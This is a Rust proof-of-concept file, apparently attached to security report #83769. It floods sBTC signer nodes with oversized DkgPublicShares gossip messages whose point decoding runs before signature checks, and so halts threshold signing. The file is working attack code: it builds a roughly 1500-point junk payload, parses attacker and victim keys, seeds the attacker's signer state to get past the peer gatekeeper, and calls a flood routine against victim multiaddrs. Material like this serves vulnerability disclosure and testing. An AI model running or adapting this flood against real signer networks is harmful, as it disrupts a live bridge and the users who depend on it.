//! PoC for report #83769: a single malicious signer floods
//! `DkgPublicShares` messages packed with points that each cost a
//! `Point::lift_x`.  The victim decodes every point on its libp2p event
//! loop *before* checking the sender's signature, so one attacker pins
//! the honest signers' network thread and halts sBTC signing.
//!
//! Build with the `testing` feature (adds the `attacker_flood` method
//! on `SignerSwarm`):
//!
//! ```text
//! cargo build --example dkg_flood --features testing
//! ```
//!
//! Usage:
//!
//! ```text
//! dkg_flood <attacker-privkey-hex> <victim-privkey-hex>=<victim-multiaddr> [...]
//! ```
//!
//! Each `<victim-privkey-hex>=<victim-multiaddr>` pair supplies both the
//! dial target and the public key we need to seed into the flooder's own
//! [`SignerState`] — otherwise the gatekeeper behaviour rejects the
//! outbound connection because that remote peer id isn't in *our* signer
//! set (see `signer/src/network/libp2p/gatekeeper.rs`).
//!
//! The trailing byte on the devenv keys (Stacks-style `…01` compression
//! flag) is stripped automatically, so you can paste the compose-file
//! values verbatim.

use std::sync::Arc;
use std::time::Duration;

use bitcoin::hashes::Hash as _;
use libp2p::Multiaddr;
use prost::Message as _;
use wsts::common::PolyCommitment;
use wsts::curve::point::Point;
use wsts::curve::scalar::Scalar;
use wsts::net::{DkgPublicShares, Message as WstsNetMessage};

use signer::context::SignerState;
use signer::ecdsa::SignEcdsa as _;
use signer::keys::{PrivateKey, PublicKey};
use signer::message::{Payload, WstsMessage, WstsMessageId};
use signer::network::libp2p::SignerSwarmBuilder;
use signer::proto;
use signer::storage::model::BitcoinBlockHash;

/// Build an oversized `DkgPublicShares` payload, wrap it in a signed
/// `SignerMessage` and encode it as gossipsub bytes.
///
/// Roughly 1500 points sit comfortably below the 65 536-byte
/// gossipsub max transmit size while still forcing 1500 `lift_x`
/// evaluations on the victim's event-loop thread per message.
fn build_junk(dkg_id: u64, key: &PrivateKey) -> Vec<u8> {
    // Any valid curve point works — pick one with `Scalar * G`.
    let point = Point::from(Scalar::from([
        0x8f, 0x9b, 0x08, 0x55, 0xe5, 0xe4, 0x01, 0xb3, 0x27, 0x65, 0xf5, 0x63, 0x71, 0x51, 0xfa,
        0x04, 0x0f, 0x16, 0x7e, 0x4a, 0x89, 0x6e, 0xc6, 0x19, 0xfa, 0x8e, 0xca, 0x33, 0x00, 0xf1,
        0xee, 0xa8,
    ]));

    let poly: Vec<Point> = std::iter::repeat(point).take(1500).collect();

    let id = wsts::schnorr::ID {
        id: Scalar::from([1u8; 32]),
        kG: point,
        kca: Scalar::from([2u8; 32]),
    };
    let comms = vec![(0u32, PolyCommitment::new(id, poly).unwrap())];

    let inner = WstsNetMessage::DkgPublicShares(DkgPublicShares {
        dkg_id,
        signer_id: 0,
        comms,
    });
    let msg = WstsMessage {
        id: WstsMessageId::Dkg([0u8; 32]),
        inner,
    };

    let tip: BitcoinBlockHash = bitcoin::BlockHash::from_byte_array([0u8; 32]).into();

    let signed = Payload::from(msg).to_message(tip).sign_ecdsa(key);
    proto::Signed::from(signed).encode_to_vec()
}

/// Accepts either a raw 32-byte hex (`0xdead…`, 64 chars) or the
/// Stacks-format 33-byte hex with the trailing `01` compression flag.
fn parse_priv(hex_str: &str) -> PrivateKey {
    let bytes = hex::decode(hex_str.trim()).expect("private key must be hex");
    let slice = if bytes.len() == 33 && bytes[32] == 0x01 {
        &bytes[..32]
    } else {
        &bytes[..]
    };
    PrivateKey::from_slice(slice).expect("private key must be 32 bytes")
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info,signer=debug".into()),
        )
        .init();

    let mut args = std::env::args().skip(1);
    let usage = "usage: dkg_flood <attacker-priv> <victim-priv>=<multiaddr> [...]";

    let attacker = parse_priv(&args.next().expect(usage));

    let victims: Vec<(PublicKey, Multiaddr)> = args
        .map(|arg| {
            let (priv_hex, addr) = arg.split_once('=').expect(usage);
            let victim_key = parse_priv(priv_hex);
            let victim_pub = PublicKey::from_private_key(&victim_key);
            let multiaddr: Multiaddr =
                addr.parse().expect("victim address must be a valid multiaddr");
            (victim_pub, multiaddr)
        })
        .collect();

    assert!(!victims.is_empty(), "{usage}");

    // The flooder's own gatekeeper rejects outbound dials to peers not
    // in its `SignerState`. Seed the state with the victims' public
    // keys so the connection-upgrade phase completes and gossipsub can
    // start pushing junk.
    let state = Arc::new(SignerState::default());
    for (pk, _) in &victims {
        state.current_signer_set().add_signer(*pk);
    }

    let dials: Vec<Multiaddr> = victims.iter().map(|(_, a)| a.clone()).collect();

    // Build a swarm that lives *alongside* the honest signer that owns
    // the attacker private key — the honest signer container is not
    // stopped for this PoC. Strip out every protocol except gossipsub:
    // kademlia/autonat/identify open extra yamux substreams the moment
    // noise completes, and with no listen address on the attacker they
    // race the honest side into tearing the connection down.
    let swarm = SignerSwarmBuilder::new(&attacker)
        .enable_mdns(false)
        .enable_kademlia(false)
        .enable_autonat(false)
        .with_num_signers(3)
        .with_initial_bootstrap_delay(Duration::MAX)
        .with_signer_state(state)
        .build()
        .expect("failed to build attacker swarm");

    swarm
        .attacker_flood(dials, move |i| build_junk(i, &attacker))
        .await
}
